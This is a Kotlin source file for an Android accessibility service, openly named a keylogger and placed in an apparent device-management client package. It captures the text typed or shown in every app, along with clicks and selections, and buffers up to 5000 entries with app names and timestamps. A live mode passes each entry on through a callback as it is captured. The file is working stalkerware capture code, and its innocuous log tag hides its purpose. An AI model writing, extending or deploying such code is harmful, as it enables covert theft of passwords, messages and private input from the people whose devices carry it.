package com.mdm.client.keylogger

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class KeyloggerAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "A11ySvc"

        @Volatile var instance: KeyloggerAccessibilityService? = null

        fun isEnabled(context: Context): Boolean {
            val componentName = "${context.packageName}/${KeyloggerAccessibilityService::class.java.canonicalName}"
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            return enabled.contains(componentName, ignoreCase = true)
        }
    }

    // Shared with KeyloggerManager — access is synchronized
    val keystrokeBuffer = mutableListOf<Map<String, Any>>()
    private val bufferLock = Any()
    private val MAX_BUFFER = 5000

    @Volatile var liveMode = false
    var onLiveKeystroke: ((Map<String, Any>) -> Unit)? = null

    override fun onServiceConnected() {
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_CLICKED or
                         AccessibilityEvent.TYPE_VIEW_LONG_CLICKED or
                         AccessibilityEvent.TYPE_VIEW_SELECTED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
            notificationTimeout = 100
        }
        Log.i(TAG, "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED  -> "TEXT_CHANGE"
            AccessibilityEvent.TYPE_VIEW_CLICKED       -> "CLICK"
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED  -> "LONG_CLICK"
            AccessibilityEvent.TYPE_VIEW_SELECTED      -> "SELECTED"
            else -> return
        }

        val text = event.text?.joinToString("") ?: return
        if (text.isBlank() && eventType == "TEXT_CHANGE") return

        val entry = mapOf(
            "package_name" to (event.packageName?.toString() ?: ""),
            "text" to text,
            "event_type" to eventType,
            "timestamp" to System.currentTimeMillis()
        )

        synchronized(bufferLock) {
            keystrokeBuffer.add(entry)
            if (keystrokeBuffer.size > MAX_BUFFER) {
                keystrokeBuffer.removeAt(0)
            }
        }

        if (liveMode) {
            onLiveKeystroke?.invoke(entry)
        }
    }

    fun getAllKeyloggerData(): List<Map<String, Any>> = synchronized(bufferLock) {
        keystrokeBuffer.toList()
    }

    fun clearBuffer() = synchronized(bufferLock) {
        keystrokeBuffer.clear()
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        Log.i(TAG, "Accessibility service destroyed")
    }
}
